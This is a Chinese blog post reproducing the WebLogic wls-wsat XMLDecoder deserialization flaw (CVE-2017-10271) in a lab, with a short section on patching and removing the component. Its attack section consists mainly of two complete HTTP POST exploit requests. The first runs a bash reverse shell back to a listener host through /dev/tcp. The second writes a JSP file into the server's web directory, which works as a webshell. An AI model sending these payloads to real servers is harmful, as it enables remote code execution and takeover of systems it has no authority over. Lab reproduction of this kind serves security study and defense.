# Weblogic wls-wsat XMLDecoder 反序列化漏洞复现（CVE-2017-10271） - 不愿透露姓名的汤姆猫 - 博客园

> 原文：[https://www.cnblogs.com/wenyoudo/p/13528453.html](https://www.cnblogs.com/wenyoudo/p/13528453.html)

## 一、漏洞描述

受影响WebLogic版本：10.3.6.0.0，12.1.3.0.0，12.2.1.1.0，12.2.1.2.0。

## 二、漏洞原理

Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令

## *三、环境搭建*

![在这里插入图片描述](../Images/4ffc2c4356faedd51882b77af74dd426.png)

## 四、漏洞复现

访问http://your-ip:7001/即可看到一个404页面，说明weblogic已成功启动。
![在这里插入图片描述](../Images/a6e9588d035e316a22b911562f937ac5.png)
用检查工具检测一下，发现存在漏洞
![在这里插入图片描述](../Images/146895a37cee0f2ba37dec1411dfedca.png)
发送反弹shell数据包

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.36.147:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 639

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.36.129/8888 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope> 
```

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12
*   13
*   14
*   15
*   16
*   17
*   18
*   19
*   20
*   21
*   22
*   23
*   24
*   25
*   26
*   27
*   28
*   29
*   30
*   31

![在这里插入图片描述](../Images/1b6ce00caae41993f4e1c1d286815251.png)
在发送数据包之前kali监听8888端口，监听端口号，burpsuite点击send发包，成功反弹shell
![在这里插入图片描述](../Images/0cda08f01eca971897fc19247d19ee87.png)
写入webshell，POST数据包如下

```
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.36.147:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope> 
```

*   1
*   2
*   3
*   4
*   5
*   6
*   7
*   8
*   9
*   10
*   11
*   12
*   13
*   14
*   15
*   16
*   17
*   18
*   19
*   20
*   21
*   22
*   23
*   24
*   25
*   26
*   27
*   28

![在这里插入图片描述](../Images/a61401766d860fc4411c5524cd87b0fd.png)
访问http://192.168.36.147:7001/bea_wls_internal/test.jsp
![在这里插入图片描述](../Images/474763e2deefd8ec2fb865f875ec2de9.png)

## 五、漏洞修复

1、安装补丁。
2、或删除wls-wsat组件，再次访问返回404.
删除C:\Oracle\Middleware\wlserver_10.3\server\lib\wls-wsat.war
删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp.internal\wls-wsat.war
删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\wls-wsat
重启Weblogic